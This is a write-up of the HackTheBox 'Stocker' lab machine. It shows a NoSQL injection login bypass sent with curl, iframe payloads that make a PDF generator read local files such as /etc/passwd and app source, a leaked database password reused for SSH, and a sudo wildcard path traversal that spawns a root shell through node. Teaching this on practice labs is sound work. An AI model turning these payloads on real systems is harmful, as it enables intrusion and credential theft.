---
title: Stocker (HTB) / Easy
image: /assets/writeups/Makima.jpeg
description: Write-up of Stocker Machine (HackTheBox) 
date: 2023-06-19
categories: [hackthebox]
tags: [hackthebox, htb, writeup, easy, machine, linux, nosqli, mongodb, expressjs, node, sudo]
author: trace
---

## Machine Information

---
- Alias: Stocker 
- Date: 19 June 2023
- Platform: HackTheBox
- OS: Linux
- Difficulty: Easy
- Tags: #htb #linux #NoSQLI #MongoDB #ExpressJS #node #sudo
- Status: Active
- IP: 10.10.11.196

---

## Resolution Summary

1. The attacker discovers a web server and an SSH service.
2. Enumerating the web server, they find the subdomain `dev`.
3. Within the subdomain, they come across a login page backed by ExpressJS.
4. They bypass authentication through NoSQL injection.
5. The attacker discovers a common item store. The page communicates with the server via the `/api` route.
6. By injecting HTML code into the checkout invoice, they gain access to local system files (LFI). They enumerate the system users (`root` and `angoose`).
7. Through trial and error, they locate a file responsible for subdomain routing at `/var/www/dev/index.js`.
8. The file contains a password for the database, matching the password of the user `angoose`.
9. With access to the server, the hacker can execute the following command as `root`: `sudo /usr/bin/node /usr/local/scripts/*.js`.
10. Using path traversal (`sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/malicious.js`), the attacker escalates privileges.

## Tools

| Purpose                           | Tools                                       |
|:----------------------------------|:--------------------------------------------|
| Port Scanning                     | [`nmap`](https://nmap.org/)                                       |
| Subdomain Enumeration             | [`ffuf`](https://github.com/ffuf/ffuf)                                       |
| Proxy                             | [`Zaproxy`](https://www.zaproxy.org/)                                    |


## Information Gathering

### Port Scanning

Searching for services on the server:

```
$ nmap -sS -oN nmap.txt 10.10.11.196
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 14:03 -03

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Enumeration

### HTTP (Nginx 1.18.0/stocker.htb)

Adding the stocker.htb to our `/etc/hosts` and requesting it, we got a simple HTML page:

<img src="/assets/writeups/2023-06-19-stocker/home.png" alt="Stocker homepage">

Interesting: this server uses Nginx as web-server[^1]. Nginx is a reverse proxy, which means that every request we send to the server passes first into it. And why it's useful? Well, one of the use cases of Nginx is to configure subdomains.[^2] Let's search for some!

##### Subdomain enumeration

```
ffuf -w ~/Projects/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://stocker.htb" -H "Host: FUZZ.stocker.htb" -fc 301

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://stocker.htb
 :: Wordlist         : FUZZ: /home/tandera/Projects/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.stocker.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 146ms]
:: Progress: [4989/4989] :: Job [1/1] :: 272 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
```

Nailed it! This box has a subdomain `dev`. Now, add `dev.stocker.htb` to the `/etc/hosts` file, and let's check it out.

### HTTP (Nginx 1.18.0 + Express/dev.stocker.htb)

[Accessing the page](http://dev.stocker.htb/), we need to sign in:

<img src="/assets/writeups/2023-06-19-stocker/login.png" alt="Subdomain login form">

The `POST` request contains two parameters: `username` and `password`. I must confess that I was really stuck at this point. I've tried SQL Injection, as well as common usernames and passwords, and even enumerated some more.

But here's the interesting part. Besides the commonly used SQL databases, the web application can also use a different type of database known as NoSQL, which doesn't follow the strict relational structure.

The good thing is, we can inject into NoSQL databases too!

One of the payloads mentioned by [Hacktricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass) is:

```json
{"username": {"$ne": null}, "password": {"$ne": null} }
```

By changing the `Content-Type` header to `application/json` and sending this payload, we were able to gain access to the stocker main page.

```shell
curl "http://dev.stocker.htb/login" -H "Content-Type: application/json" -d '{"username": {"$ne": null}, "password": {"$ne": null} }'

* Connected to dev.stocker.htb (10.10.11.196) port 80 (#0)
> POST /login HTTP/1.1
> Host: dev.stocker.htb
> Content-Type: application/json
> ...
>
< HTTP/1.1 302 Found
< Server: nginx/1.18.0 (Ubuntu)
< X-Powered-By: Express
< Location: /stock
< Set-Cookie: connect.sid=s%3AqGMRmpDVrXcgo8u6P8cvnkxXulrDf2xh.EJzRuuoN6u0mVuOXo449k1SVf%2FBDed2jDyB4Sq3p1Kk; Path=/; HttpOnly
< ...
* Connection #0 to host dev.stocker.htb left intact
Found. Redirecting to /stock
```

#### But why this occurs? 

- Well, the server **doesn't restrict the Content-Type** of the request in the first place. This allow us to send JSON data in it's body.
- Secondly, the server **understands the JSON** sent and uses it to authenticate the user. 
- Finally, the data is **not sanitized at all**, allowing us to manipulate the query expression.


Later on, we can access the source of the server in `/var/www/dev/index.js`. Analyzing the code, we discover the snippet of authentication: 

```js 
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

// ...

app.post("/login", async (req, res) => {
  const { username, password } = req.body;
  
  if (!username || !password) return res.redirect("/login?error=login-error");

  const user = await mongoose.model("User").findOne({ username, password });

  if (!user) return res.redirect("/login?error=login-error");

  req.session.user = user.id;

  console.log(req.session);

  return res.redirect("/stock");
});
```

Because the route `/login` doesn't specify the parser, both `json` and `x-www-form-urlencoded` can be used. 

When we send the payload, the server assigns the username and password:

```js
username = {"$ne": null}; 
password = {"$ne": null};
```

Then, the server will request the database:

```js 
const user = await mongoose.model("User").findOne({ {"$ne": null}, {"$ne": null} });
```

And what on earth this means? Simple: find the first document where **any field is not null**. The server finds the user angoose and authenticate us.

Beautiful, isn't it? 

#### Stockers

After the authentication, we're redirected to the Stockers page:

<img src="/assets/writeups/2023-06-19-stocker/stocker_main_page.png" alt="Stocker main page">

Seeking the JS code, we find that this page communicate with two end-points:

- `/api/products` -> get all products available. Called in the page load.

<img src="/assets/writeups/2023-06-19-stocker/api_products.png" alt="JS function to request the /api/products">

- `/api/order` -> get all products selected (on cart) and send it to the server. If ok, a link to `/api/po/<RESPONSE_ORDER_ID>` is referenced on the page, leading to a `.pdf` file.

<img src="/assets/writeups/2023-06-19-stocker/api_order.png" alt="JS function to request the /api/order">

<img src="/assets/writeups/2023-06-19-stocker/pdf_link.png" alt="PDF of the order">

Checking the `/api/order` request on Zaproxy:

<img src="/assets/writeups/2023-06-19-stocker/order_request.png" alt="Order request">

<img src="/assets/writeups/2023-06-19-stocker/order_response.png" alt="Order response">

To see the output `.pdf` file, go to `http://dev.stocker.htb/po/<orderID>`:

<img src="/assets/writeups/2023-06-19-stocker/pdf.png" alt="Order checkout pdf">

## Exploitation

This file could be generate with HTML code (for example, with the [Puppeteer](https://www.bannerbear.com/blog/how-to-convert-html-into-pdf-with-node-js-and-puppeteer/) or the [html-pdf-node](https://www.npmjs.com/package/html-pdf-node) library). Trying to inject HTML code in the `title` parameter, we get a LFI:

```json
{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe width=600px height=600px src=/etc/passwd></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

<img src="/assets/writeups/2023-06-19-stocker/etc_passwd.png" alt="LFI to get /etc/passwd">

There two logable users on this system: `root` and `angoose`. Notice the existence of a MongoDB user. This explains why did we manage to bypass authentication.

Let's try to get the app source code:

```json
{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe width=800px height=800px src=/var/www/html/index.html></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

<img src="/assets/writeups/2023-06-19-stocker/pdf_index_html.png" alt="Index page of stocker.htb">

And there it is!

Now we can try to get the source code for the subdomain. Usually, ExpressJS servers use `index.js` or `main.js` as the entry-point for the server. Let's retrieve it!

```json
{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe width=800px height=800px src=/var/www/html/dev/index.js></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

<img src="/assets/writeups/2023-06-19-stocker/pdf_blank.png" alt="Possible route for index.js">

Nothing... alright, let's think a little.

Remember that this machine uses Nginx as a reverse proxy? Well, we can retrieve the Nginx configuration file.

```json
{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe width=1000px height=1000px src=/etc/nginx/nginx.conf></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

<img src="/assets/writeups/2023-06-19-stocker/pdf_nginx.png" alt="Nginx config file">


So close. To see what's the routes in Nginx, we've just needed to scroll down a little. If I try to increase the height atribute, the server returns a `500 Internal Server Error`.

Let's play dirty, then.

Guessing the file, we find that the correct path is `/var/www/dev/index.js`:

```json
{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe width=1000px height=1000px src=/var/www/dev/index.js></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

<img src="/assets/writeups/2023-06-19-stocker/index_js.png" alt="Index.js file">

Our golden ticket. The MongoDB password is in plain text on the code: `IHeardPassphrasesArePrettySecure`

Trying this password with the user `angoose` and we're in.

## Privilege Escalation

#### Local Enumeration (angoose)
---
- id: `uid=1001(angoose) gid=1001(angoose) groups=1001(angoose)`
- system: `Ubuntu 20.04.5 LTS`
- users: `root` and `angoose`
- kernel: `5.4.0-136-generic`
- sudo: `sudo /usr/bin/node /usr/local/scripts/*.js`

---

This sudo permission looks like our way to root. Let's check this out.

```shell
cd /usr/local/scripts/
ls
creds.js  findAllOrders.js  findUnshippedOrders.js  node_modules  profitThisMonth.js  schema.js
```

We cannot read any of this files and write new ones. By context, we can imagine that this scripts are part of the web application and, with further investigation, it's possible to exploit it. But there's a much more easier way to do it. Follow me.

We've checked the sudo permissions of `angoose` with the command `sudo -l` . The system informs us that we can execute everything in the scripts folder (since the file extension is `.js`):

```shell
$ sudo -l
# ...
User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

But here's the catch: the wildcard `*` includes the `.` and `..` directories, allowing us to path traversal with root privileges.[^3]

#### Exploitation

First, let's create a `malicious.js` file with our contents:

```shell
cd  # Returns to /home/angoose
vim malicious.js
```

Spawning a shell:

```js
const { spawn } = require('child_process');
const bash = spawn('bash');

bash.stdout.pipe(process.stdout);
bash.stderr.pipe(process.stderr);
process.stdin.pipe(bash.stdin);
```

Running the file:

```shell
sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/malicious.js
whoami
# root
```

Thanks for reading and happy hacking!

---
[^1]: Through the `Server` header.
[^2]: I discovered it in the P&D group of my College. We've needed to configure two subdomains of a web-app, and, researching, i've found about it. Make sure to [check the project!](https://github.com/entr0pie/api-tamagochi/tree/docker-nginx)
[^3]: If you want a deep dive into how this works, make sure to check the [David Hamann article](https://davidhamann.de/2023/02/24/beware-of-wildcard-paths-sudo/).
